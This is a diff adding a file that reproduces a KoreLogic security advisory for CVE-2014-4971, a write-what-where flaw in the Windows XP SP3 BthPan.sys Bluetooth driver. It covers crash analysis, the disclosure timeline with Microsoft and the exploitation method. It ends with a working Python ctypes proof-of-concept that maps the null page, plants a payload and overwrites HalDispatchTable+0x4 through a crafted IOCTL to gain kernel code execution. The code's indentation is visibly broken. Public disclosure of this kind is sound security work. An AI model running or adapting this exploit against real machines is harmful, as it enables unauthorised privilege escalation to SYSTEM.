@@ -1,0 +1,226 @@
+"""
+Title: Microsoft XP SP3 BthPan.sys Arbitrary Write Privilege Escalation
+Advisory ID: KL-001-2014-002
+Publication Date: 2014-07-18
+Publication URL: https://www.korelogic.com/Resources/Advisories/KL-001-2014-002.txt
+
+
+1. Vulnerability Details
+
+     Affected Vendor: Microsoft
+     Affected Product: Bluetooth Personal Area Networking
+     Affected Versions: 5.1.2600.5512
+     Platform: Microsoft Windows XP SP3
+     CWE Classification: CWE-123: Write-what-where Condition
+     Impact: Privilege Escalation
+     Attack vector: IOCTL
+     CVE ID: CVE-2014-4971
+
+2. Vulnerability Description
+
+     A vulnerability within the BthPan module allows an attacker to
+     inject memory they control into an arbitrary location they
+     define. This can be used by an attacker to overwrite
+     HalDispatchTable+0x4 and execute arbitrary code by subsequently
+     calling NtQueryIntervalProfile.
+
+3. Technical Description
+
+     A userland process can create a handle into the BthPan device
+     and subsequently make DeviceIoControlFile() calls into that
+     device. During the IRP handler routine for 0x0012b814 the user
+     provided OutputBuffer address is not validated. This allows an
+     attacker to specify an arbitrary address and write
+     (or overwrite) the memory residing at the specified address.
+     This is classicaly known as a write-what-where vulnerability and
+     has well known exploitation methods associated with it.
+
+     A stack trace from our fuzzing can be seen below. In our fuzzing
+     testcase, the specified OutputBuffer in the DeviceIoControlFile()
+     call is 0xffff0000.
+
+STACK_TEXT:
+b1e065b8 8051cc7f 00000050 ffff0000 00000001 nt!KeBugCheckEx+0x1b
+b1e06618 805405d4 00000001 ffff0000 00000000 nt!MmAccessFault+0x8e7
+b1e06618 804f3b76 00000001 ffff0000 00000000 nt!KiTrap0E+0xcc
+b1e066e8 804fdaf1 8216cc80 b1e06734 b1e06728 nt!IopCompleteRequest+0x92
+b1e06738 80541890 00000000 00000000 00000000 nt!KiDeliverApc+0xb3
+b1e06758 804fb4a7 8055b1c0 81bdeda8 b1e0677c nt!KiUnlockDispatcherDatabase+0xa8
+b1e06768 80534b09 8055b1c0 81f7a290 81f016b8 nt!KeInsertQueue+0x25
+b1e0677c f83e26ec 81f7a290 00000000 b1e067a8 nt!ExQueueWorkItem+0x1b
+b1e0678c b272b5a1 81f7a288 00000000 81e002d8 NDIS!NdisScheduleWorkItem+0x21
+b1e067a8 b273a544 b1e067c8 b273a30e 8216cc40 bthpan!BthpanReqAdd+0x16b
+b1e069e8 b273a62b 8216cc40 00000258 81e6f550 bthpan!IoctlDispatchDeviceControl+0x1a8
+b1e06a00 f83e94bb 81e6f550 8216cc40 81d74d68 bthpan!IoctlDispatchMajor+0x93
+b1e06a18 f83e9949 81e6f550 8216cc40 8217e6e8 NDIS!ndisDummyIrpHandler+0x48
+b1e06ab4 804ee129 81e6f550 8216cc40 806d32d0 NDIS!ndisDeviceControlIrpHandler+0x5c
+b1e06ac4 80574e56 8216ccb0 81d74d68 8216cc40 nt!IopfCallDriver+0x31
+b1e06ad8 80575d11 81e6f550 8216cc40 81d74d68 nt!IopSynchronousServiceTail+0x70
+b1e06b80 8056e57c 000006a8 00000000 00000000 nt!IopXxxControlFile+0x5e7
+b1e06bb4 b1a2506f 000006a8 00000000 00000000 nt!NtDeviceIoControlFile+0x2a
+WARNING: Stack unwind information not available. Following frames may be wrong.
+
+     Reviewing the FOLLOWUP_IP value from the WinDBG '!analyze -v'
+     command shows the fault originating in the bthpan driver.
+
+FOLLOWUP_IP:
+bthpan!BthpanReqAdd+16b
+b272b5a1 ebc2            jmp     bthpan!BthpanReqAdd+0x12f (b272b565)
+
+     Reviewing the TRAP_FRAME at the time of crash we can see
+     IopCompleteRequest() copying data from InputBuffer into the
+     OutputBuffer. InputBuffer is another parameter provided to the
+     DeviceIoControlFile() function and is therefore controllable by
+     the attacker. The edi register contains the invalid address
+     provided during the fuzz testcase.
+
+TRAP_FRAME:  b1e06630 -- (.trap 0xffffffffb1e06630)
+ErrCode = 00000002
+eax=0000006a ebx=8216cc40 ecx=0000001a edx=00000001 esi=81e002d8 edi=ffff0000
+eip=804f3b76 esp=b1e066a4 ebp=b1e066e8 iopl=0         nv up ei pl nz na po cy
+cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010203
+nt!IopCompleteRequest+0x92:
+804f3b76 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+
+     A write-what-where vulnerability can be leveraged to obtain
+     escalated privileges. To do so, an attacker will need to
+     allocate memory in userland that is populated with shellcode
+     designed to find the Token for PID 4 (System) and then overwrite
+     the token for its own process. By leveraging the vulnerability
+     in BthPan it is then possible to overwrite the pointer at
+     HalDispatchTable+0x4 with a pointer to our shellcode. Calling
+     NtQueryIntervalProfile() will subsequently call
+     HalDispatchTable+0x4, execute our shellcode, and elevate the
+     privilege of the exploit process.
+
+4. Mitigation and Remediation Recommendation
+
+     None. A patch is not likely to be forthcoming from the vendor.
+
+5. Credit
+
+     This vulnerability was discovered by Matt Bergin of KoreLogic
+     Security, Inc.
+
+6. Disclosure Timeline
+
+   2014.04.28 - Initial contact; sent Microsoft report and PoC.
+   2014.04.28 - Microsoft acknowledges receipt of vulnerability
+                report; states XP is no longer supported and asks if
+                the vulnerability affects other versions of Windows.
+   2014.04.29 - KoreLogic asks Microsoft for clarification of their
+                support policy for XP.
+   2014.04.29 - Microsoft says XP-only vulnerabilities will not be
+                addressed with patches.
+   2014.04.29 - KoreLogic asks if Microsoft intends to address the
+                vulnerability report.
+   2014.04.29 - Microsoft opens case to investigate the impact of the
+                vulnerability on non-XP systems.
+   2014.05.06 - Microsoft asks again if this vulnerability affects
+                non-XP systems.
+   2014.05.14 - KoreLogic informs Microsoft that the vulnerability
+                report is for XP and other Windows versions have not
+                been examined.
+   2014.06.11 - KoreLogic informs Microsoft that 30 business days have
+                passed since vendor acknowledgement of the initial
+                report.  KoreLogic requests CVE number for the
+                vulnerability, if there is one. KoreLogic also
+                requests vendor's public identifier for the
+                vulnerability along with the expected disclosure date.
+   2014.06.11 - Microsoft informs KoreLogic that the vulnerability
+                does not impact any "up-platform" products. Says they
+                are investigating embedded platforms. Does not provide
+                CVE number.
+   2014.06.24 - Microsoft contacts KoreLogic to say that they confused
+                the report of this vulnerability with another and that
+                they cannot reproduce the described behavior.
+                Microsoft asks for an updated Proof-of-Concept, crash
+                dumps or any further analysis of the vulnerability
+                that KoreLogic can provide.
+   2014.06.25 - KoreLogic provides Microsoft with an updated
+                Proof-of-Concept which demonstrates using the
+                vulnerability to spawn a system shell.
+   2014.06.30 - KoreLogic asks Microsoft for confirmation of their
+                receipt of the updated PoC. Also requests that a CVE
+                ID be issued for this vulnerability.
+   2014.07.02 - 45 business days have elapsed since Microsoft
+                acknowledged receipt of the vulnerability report and
+                PoC.
+   2014.07.07 - KoreLogic requests CVE from MITRE.
+   2014.07.18 - MITRE deems this vulnerability (KL-001-2014-002) to be
+                identical to KL-001-2014-003 and issues CVE-2014-4971
+                for both vulnerabilities.
+   2014.07.18 - Public disclosure.
+
+7. Proof of Concept
+"""
+
+#!/usr/bin/python2
+#
+# KL-001-2014-002 : Microsoft XP SP3 BthPan.sys Arbitrary Write Privilege Escalation
+# Matt Bergin (KoreLogic / Smash the Stack) 
+# CVE-2014-4971
+#
+from ctypes import *
+from struct import pack
+from os import getpid,system
+from sys import exit
+     EnumDeviceDrivers,GetDeviceDriverBaseNameA,CreateFileA,NtAllocateVirtualMemory,WriteProcessMemory,LoadLibraryExA = windll.Psapi.EnumDeviceDrivers,windll.Psapi.GetDeviceDriverBaseNameA,windll.kernel32.CreateFileA,windll.ntdll.NtAllocateVirtualMemory,windll.kernel32.WriteProcessMemory,windll.kernel32.LoadLibraryExA
+     GetProcAddress,DeviceIoControlFile,NtQueryIntervalProfile,CloseHandle = windll.kernel32.GetProcAddress,windll.ntdll.ZwDeviceIoControlFile,windll.ntdll.NtQueryIntervalProfile,windll.kernel32.CloseHandle
+     INVALID_HANDLE_VALUE,FILE_SHARE_READ,FILE_SHARE_WRITE,OPEN_EXISTING,NULL = -1,2,1,3,0
+     
+     # thanks to offsec for the concept
+     # I re-wrote the code as to not fully insult them 
+     def getBase(name=None):
+     	retArray = c_ulong*1024
+     	ImageBase = retArray()
+     	callback = c_int(1024)
+     	cbNeeded = c_long()
+     	EnumDeviceDrivers(byref(ImageBase),callback,byref(cbNeeded))
+     	for base in ImageBase:
+     		driverName = c_char_p("\x00"*1024)
+     		GetDeviceDriverBaseNameA(base,driverName,48)
+     		if (name):
+     			if (driverName.value.lower() == name):
+     				return base
+     		else:
+     			return (base,driverName.value)
+     	return None
+     
+     handle = CreateFileA("\\\\.\\BthPan",FILE_SHARE_WRITE|FILE_SHARE_READ,0,None,OPEN_EXISTING,0,None)
+     if (handle == INVALID_HANDLE_VALUE):
+	print "[!] Could not open handle to BthPan"
+	exit(1)
+     NtAllocateVirtualMemory(-1,byref(c_int(0x1)),0x0,byref(c_int(0xffff)),0x1000|0x2000,0x40)
+     buf = "\xcc\xcc\xcc\xcc"+"\x90"*0x400
+     WriteProcessMemory(-1, 0x1, "\x90"*0x6000, 0x6000, byref(c_int(0)))
+     WriteProcessMemory(-1, 0x1, buf, 0x400, byref(c_int(0)))
+     kBase,kVer = getBase()
+     hKernel = LoadLibraryExA(kVer,0,1)
+     HalDispatchTable = GetProcAddress(hKernel,"HalDispatchTable")
+     HalDispatchTable -= hKernel
+     HalDispatchTable += kBase
+     HalDispatchTable += 0x4
+     DeviceIoControlFile(handle,NULL,NULL,NULL,byref(c_ulong(8)),0x0012d814,0x1,0x258,HalDispatchTable,0)
+     CloseHandle(handle)
+     NtQueryIntervalProfile(c_ulong(2),byref(c_ulong()))
+     exit(0)
+
+"""
+The contents of this advisory are copyright(c) 2014 KoreLogic, Inc.
+and are licensed under a Creative Commons Attribution Share-Alike 4.0
+(United States) License:
+http://creativecommons.org/licenses/by-sa/4.0/
+
+KoreLogic, Inc. is a founder-owned and operated company with a proven
+track record of providing security services to entities ranging from
+Fortune 500 to small and mid-sized companies. We are a highly skilled
+team of senior security consultants doing by-hand security assessments
+for the most important networks in the U.S. and around the world. We
+are also developers of various tools and resources aimed at helping
+the security community.
+https://www.korelogic.com/about-korelogic.html
+
+Our public vulnerability disclosure policy is available at:
+https://www.korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v1.0.txt
+"""
